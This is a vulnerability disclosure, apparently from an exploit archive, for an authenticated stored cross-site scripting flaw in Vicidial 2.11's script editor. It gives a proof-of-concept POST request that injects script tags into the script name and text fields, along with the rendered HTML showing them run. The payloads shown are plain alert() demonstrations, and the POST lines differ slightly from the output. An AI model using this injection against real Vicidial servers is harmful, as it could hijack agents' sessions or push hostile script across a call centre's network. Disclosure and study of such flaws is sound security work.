@@ -1,0 +1,63 @@
+# Exploit Title: Vicidial 2.11 Scripts - Authenticated Stored XSS
+# Date: 0 day
+# Exploit Author: David Silveiro
+# Exploit Author Github: github.com/davidsilveiro
+# Vendor Homepage: http://vicidial.org
+# Software Link: https://sourceforge.net/projects/astguiclient/files/astguiclient_2.11rc1.zip/download
+
+
+Vicidial is a popular opensource software, used throughout many different sectors,
+such as; call centers for inbound & outband calling.
+
+The vulnerablility is triggered when an authenticated with user sufficient permissions, 
+creates a script (small text document that the agents use for remembering lines)without 
+sufficient sanitization happening within "Script Name" and "Script Text". Due to the nature 
+of how widely this script can be set, for example a whole Tele-marketing campaign or specific
+ agent, it could very easily be used to infect other hosts on the Network.
+
+POC:
+
+http://localhost.com/vicidial_demo/admin.php?ADD=1111111
+
+POST Data (script_name & script_text); 
+
+ADD=2111111&DB=&script_id=tests&script_name=<script>alert('XSS!'</script>&script_comments=test&
+active=Y&user_group=---ALL---&selectedField=fullname&script_text=<script>alert('XSS 2!'</script>&SUBMIT=SUBMIT
+
+Click 'Preview Script'
+
+    <html>
+
+    <head></head>
+    <body bgcolor="white" marginwidth="0" marginheight="0" topmargin="0" leftmargin="0">
+        <font size="2" color="BLACK" face="ARIAL,HELVETICA">
+            <font size="2" color="BLACK" face="ARIAL,HELVETICA">
+
+                Preview Script: 1017
+
+                <br></br>
+                <table width="600">
+                    <tbody>
+                        <tr>
+                            <td>
+                                <center>
+                                <script>
+
+                                    alert('XSS!')
+
+                                </script>
+                                    <br></br>
+                                </center>
+                                <script>
+
+                                    alert('XSS 2!')
+
+                                </script>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </font>
+        </font>
+    </body>
+    </html>
